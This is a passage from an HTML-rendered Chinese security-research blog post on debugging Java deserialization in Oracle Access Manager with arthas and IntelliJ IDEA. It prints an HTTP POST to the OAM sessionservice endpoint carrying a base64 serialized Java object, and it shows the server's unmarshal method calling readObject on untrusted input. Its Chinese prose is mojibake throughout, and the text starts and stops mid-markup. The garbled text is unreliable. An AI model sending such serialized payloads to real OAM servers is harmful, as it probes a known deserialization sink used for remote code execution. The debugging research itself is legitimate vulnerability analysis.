</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-8>8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-9>9</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>å®‰è£…arthasï¼š
</span></span><span style=display:flex><span>docker exec -it oamms bash
</span></span><span style=display:flex><span>curl -O https://arthas.aliyun.com/arthas-boot.jar
</span></span><span style=display:flex><span>java -jar arthas-boot.jar
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>å¯»æ‰¾JVMæ˜¯å¦åŠ è½½äº†ç±»
</span></span><span style=display:flex><span>sc -d com.tangosol.internal.util.invoke.RemoteConstructor 
</span></span><span style=display:flex><span>sc -d *RemoteConstructor*
</span></span><span style=display:flex><span>sc -d oracle.security.am.proxy.opensso.controller.OpenssoEngineController
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220707114733622.png alt=image-20220707114733622></p><h2 id=å¦‚ä½•ä¸è°ƒè¯•æŸ¥çœ‹æœåŠ¡ç«¯æŸæ–¹æ³•çš„è¿”å›å€¼>å¦‚ä½•ä¸è°ƒè¯•æŸ¥çœ‹æœåŠ¡ç«¯æŸæ–¹æ³•çš„è¿”å›å€¼ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#å¦‚ä½•ä¸è°ƒè¯•æŸ¥çœ‹æœåŠ¡ç«¯æŸæ–¹æ³•çš„è¿”å›å€¼>#</a></h2><p>é™¤äº†æŸ¥è¯¢JVMä¸­å·²åŠ è½½çš„ç±»çš„ä¿¡æ¯å¤–ï¼Œarthasè¿˜æœ‰ä¸€äº›å¾ˆæ£’çš„ç”¨æ³•ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼šåœ¨arthasç»ˆç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åå‘é€ä¸€ä¸ªåŒ…å« oracle.security.am.proxy.opensso.session.utils.SessionID å¯¹è±¡çš„è¯·æ±‚åˆ° /oam/server/opensso/sessionservice æ¥å£åï¼Œä¼šæ‰“å°å‡ºæˆåŠŸååºåˆ—åŒ–åçš„å¯¹è±¡çš„ä¿¡æ¯ã€‚</p><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-123-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-123-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>watch oracle.security.am.proxy.opensso.controller.OpenssoEngineController unmarshal returnObj
</span></span></code></pre></td></tr></table></div></div><p>å‘é€è¯·æ±‚ï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 906
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;b2JqZWN0OnJPMEFCWE55QURodmNtRmpiR1V1YzJWamRYSnBkSGt1WVcwdWNISnZlSGt1YjNCbGJuTnpieTV6WlhOemFXOXVMblYwYVd4ekxsTmxjM05wYjI1SlJLOGVKQWl5c3BxUUFnQUhXZ0FJYVhOUVlYSnpaV1JNQUFwamIyOXJhV1ZOYjJSbGRBQVRUR3BoZG1FdmJHRnVaeTlDYjI5c1pXRnVPMHdBRDJWdVkzSjVjSFJsWkZOMGNtbHVaM1FBRWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzB3QURXVjRkR1Z1YzJsdmJsQmhjblJ4QUg0QUFrd0FDbVY0ZEdWdWMybHZibk4wQUE5TWFtRjJZUzkxZEdsc0wwMWhjRHRNQUE5elpYTnphVzl1VTJWeWRtVnlTVVJ4QUg0QUFrd0FCSFJoYVd4eEFINEFBbmh3QUhCMEFBTnVaVzl3YzNJQUVXcGhkbUV1ZFhScGJDNUlZWE5vVFdGd0JRZmF3Y01XWU5FREFBSkdBQXBzYjJGa1JtRmpkRzl5U1FBSmRHaHlaWE5vYjJ4a2VIQS9RQUFBQUFBQUFIY0lBQUFBRUFBQUFBQjRkQUFBY0E9PQ==&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>çœ‹åˆ°unmarshalæ–¹æ³•è¿”å›çš„å¯¹è±¡ä¿¡æ¯ï¼š</p><p><img loading=lazy src=image-20220707113031957.png alt=image-20220707113031957></p><p>ç›¸å…³ä»£ç å—ï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>private</span> Object <span style=color:#a6e22e>unmarshal</span><span style=color:#f92672>(</span>String requester<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>requester<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;token:&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>createSessionID</span><span style=color:#f92672>(</span>requester<span style=color:#f92672>.</span><span style=color:#a6e22e>substring</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;token:&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>requester<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;object:&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ObjectInputStream is <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                is <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ByteArrayInputStream<span style=color:#f92672>(</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>requester<span style=color:#f92672>.</span><span style=color:#a6e22e>substring</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;object:&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>()))));</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException var4<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                LOGGER<span style=color:#f92672>.</span><span style=color:#a6e22e>log</span><span style=color:#f92672>(</span>Level<span style=color:#f92672>.</span><span style=color:#a6e22e>WARNING</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;Error in unmarshalling requester&#34;</span><span style=color:#f92672>,</span> var4<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> is<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Bad context value:&#34;</span> <span style=color:#f92672>+</span> requester<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æ­¤å¤–ï¼Œå¦‚æœéœ€è¦è§‚å¯Ÿ <code>java.*</code> ä¸‹çš„ç±»ï¼Œè¦å…ˆæ‰“å¼€å®‰å…¨å¼€å…³ã€‚æ¯”å¦‚æŸ¥çœ‹ä»åºåˆ—åŒ–æ•°æ®ä¸­æå–å‡ºæ¥çš„ç±»åï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-126-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-126-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-126-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-126-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>options unsafe true
</span></span><span style=display:flex><span>watch java.io.ObjectInputStream readClassDesc returnObj
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220707114454253.png alt=image-20220707114454253></p><h2 id=ä¸ºä½•æœ‰æ—¶æŒ‚ä¸Šè°ƒè¯•ååº”ç”¨å¡æ­»>ä¸ºä½•æœ‰æ—¶æŒ‚ä¸Šè°ƒè¯•ååº”ç”¨å¡æ­»ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#ä¸ºä½•æœ‰æ—¶æŒ‚ä¸Šè°ƒè¯•ååº”ç”¨å¡æ­»>#</a></h2><p>æœ‰æ—¶å€™ideaæŒ‚åˆ°webappä¸Šé¢è°ƒè¯•çš„æ—¶å€™ï¼Œç”¨burpå‘åŒ…ï¼Œå¾ˆä¹…éƒ½æ²¡æœ‰å“åº”ï¼Œideaä¹Ÿæ²¡æœ‰æ•è·åˆ°æ–­ç‚¹ã€‚ä½†å¦‚æœæŠŠæ‰€æœ‰æ–­ç‚¹éƒ½å¤±æ•ˆï¼Œburpå°±é©¬ä¸Šæœ‰å“åº”äº†ã€‚</p><p>è¿™ç§æƒ…å†µå¯èƒ½æ˜¯å› ä¸ºæœ‰æ–­ç‚¹ä¸‹åœ¨äº†Java methodä¸­ï¼ˆå³java.*ä¸‹çš„ä»£ç ï¼‰ï¼Œå¯¼è‡´æ–­ç‚¹å¤ªç»å¸¸è¢«è§¦å‘äº†ã€‚Ideaåœ¨ç¬¬ä¸€æ¬¡ä¸‹è¿™ç§æ–­ç‚¹çš„æ—¶å€™ä¹Ÿä¼šæœ‰æç¤ºï¼š<code>Method breakpoints may dramatically slow down debugging</code> ã€‚</p><p>è§£å†³åŠæ³•æ˜¯æŠŠJava Method Breakpointsè¿™ç±»æ–­ç‚¹éƒ½å…ˆdeactivateï¼Œå…ˆåœ¨java line breakpointé‡Œé¢ä¸‹æ–­ï¼Œè·‘èµ·æ¥æ–­ä¸‹æ¥ä»¥åï¼Œå†å¼€å¯Javamethod breakpointsé‡Œé¢çš„æ–­ç‚¹ã€‚</p><p><img loading=lazy src=image-20220324000143091.png alt=image-20220324000143091></p><h2 id=è°ƒè¯•æ—¶æ— æ³•è¿›å…¥javaåŒ…ä¸­çš„ä»£ç >è°ƒè¯•æ—¶æ— æ³•è¿›å…¥java.*åŒ…ä¸­çš„ä»£ç ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#è°ƒè¯•æ—¶æ— æ³•è¿›å…¥javaåŒ…ä¸­çš„ä»£ç >#</a></h2><p>å¦‚æœè°ƒè¯•è¿›ä¸å»readOBjectï¼Œéœ€è¦åœ¨ideaçš„debuggerè®¾ç½®ä¸­å»é™¤ä¸è¿›å…¥java.io.*ç±»çš„é€‰é¡¹ã€‚</p><p><img loading=lazy src=image-20220630161455653.png alt=image-20220630161455653></p><h2 id=arthasé™„åˆ°javaè¿›ç¨‹åideaè°ƒè¯•å‡ºé—®é¢˜>arthasé™„åˆ°Javaè¿›ç¨‹åideaè°ƒè¯•å‡ºé—®é¢˜<a hidden class=anchor aria-hidden=true href=#arthasé™„åˆ°javaè¿›ç¨‹åideaè°ƒè¯•å‡ºé—®é¢˜>#</a></h2><p>å¦‚æœideaè°ƒè¯•ä¼šå‡ºç°å„ç§å¥‡æ€ªçš„éš¾ä»¥ç†è§£çš„é—®é¢˜ï¼Œå¯ä»¥æŸ¥çœ‹java webçš„æ—¥å¿—çœ‹æ˜¯å¦å’Œarthasæœ‰å…³ï¼Œå¯èƒ½æ˜¯ç”±äºarthasåœ¨watchæŸäº›åœ°æ–¹å¯¼è‡´çš„ï¼Œè¿™æ—¶å¯ä»¥å°è¯•å…ˆé€€å‡ºarthasï¼Œå†è°ƒè¯•ã€‚</p><p><img loading=lazy src=image-20220707164507561.png alt=image-20220707164507561></p><h2 id=ä¸‹æ–­ç‚¹æ˜¾ç¤ºç°è‰²æ€ä¹ˆåŠ>ä¸‹æ–­ç‚¹æ˜¾ç¤ºç°è‰²æ€ä¹ˆåŠï¼Ÿ<a hidden class=anchor aria-hidden=true href=#ä¸‹æ–­ç‚¹æ˜¾ç¤ºç°è‰²æ€ä¹ˆåŠ>#</a></h2><p>ä¸‹æ–­ç‚¹æ˜¾ç¤ºç°è‰²ï¼Œæç¤º &ldquo;no executable code found at line 46 in class java.io.ObjectOutputStream&rdquo; ã€‚</p><p><img loading=lazy src=image-20220630161853774.png alt=image-20220630161853774></p><p><img loading=lazy src=image-20220630161858107.png alt=image-20220630161858107></p><p>åŸå› æ˜¯ideaä¸­ä½¿ç”¨çš„JDKç‰ˆæœ¬å’Œè¿œç¨‹æœåŠ¡å™¨ä¸Šä½¿ç”¨çš„JDKç‰ˆæœ¬ä¸åŒå¯¼è‡´æºç è¡Œæ•°å¯¹ä¸ä¸Šï¼Œæ¯”å¦‚åœ¨æˆ‘çš„ç¯å¢ƒä¸­ï¼Œåœ¨oamms serverä¸­ä½¿ç”¨çš„æ˜¯1.8.0_281ï¼Œideaä¸­ä½¿ç”¨çš„æ˜¯1.8.0_333ã€‚</p><p><img loading=lazy src=image-20220630162229668.png alt=image-20220630162229668></p><p><img loading=lazy src=image-20220630162253405.png alt=image-20220630162253405></p><p>å»ä¸‹è½½å®Œå…¨ç›¸åŒçš„ç‰ˆæœ¬ï¼Œä»https://www.oracle.com/java/technologies/downloads/archive/</p><p><img loading=lazy src=image-20220630164451670.png alt=image-20220630164451670></p><p>è¿›åˆ° <a href=https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html>https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html</a></p><p><img loading=lazy src=image-20220630164535064.png alt=image-20220630164535064></p><p>ä¸‹è½½jdk-8u281-linux-x64.tar.gzå‹ç¼©åŒ…ï¼Œåœ¨ideaä¸­åŠ è½½JDKï¼Œç„¶åå°±å¯ä»¥äº†ã€‚</p><h2 id=å…³é—­smart-step-into>å…³é—­smart step into<a hidden class=anchor aria-hidden=true href=#å…³é—­smart-step-into>#</a></h2><p>æœ‰æ—¶ideaä¼šè‡ªåŠ¨è·³è¿‡æŸäº›ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å…³é—­smart step intoè®©å®ƒå¦‚å®æ‰§è¡ŒæŒ‡ä»¤ã€‚</p><p><img loading=lazy src=image-20220630225616330.png alt=image-20220630225616330></p><h2 id=æ¯”è¾ƒå­—èŠ‚æµ>æ¯”è¾ƒå­—èŠ‚æµ<a hidden class=anchor aria-hidden=true href=#æ¯”è¾ƒå­—èŠ‚æµ>#</a></h2><p>æœ‰æ—¶éœ€è¦æ¯”è¾ƒä¸¤ä¸ªå­—èŠ‚æµæ˜¯å¦å®Œå…¨ä¸€è‡´ï¼Œå¯ä»¥ä½¿ç”¨MD5å€¼æ¥æ¯”è¾ƒ</p><p>åœ¨idaeçš„evaluateåŠŸèƒ½ä¸­æ‰§è¡Œã€‚ï¼ˆå¿«æ·é”®ï¼šalt+f8ï¼‰</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-127-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-127-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-127-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-127-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>math</span><span style=color:#f92672>.</span><span style=color:#a6e22e>BigInteger</span><span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>MessageDigest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getInstance</span><span style=color:#f92672>(</span><span 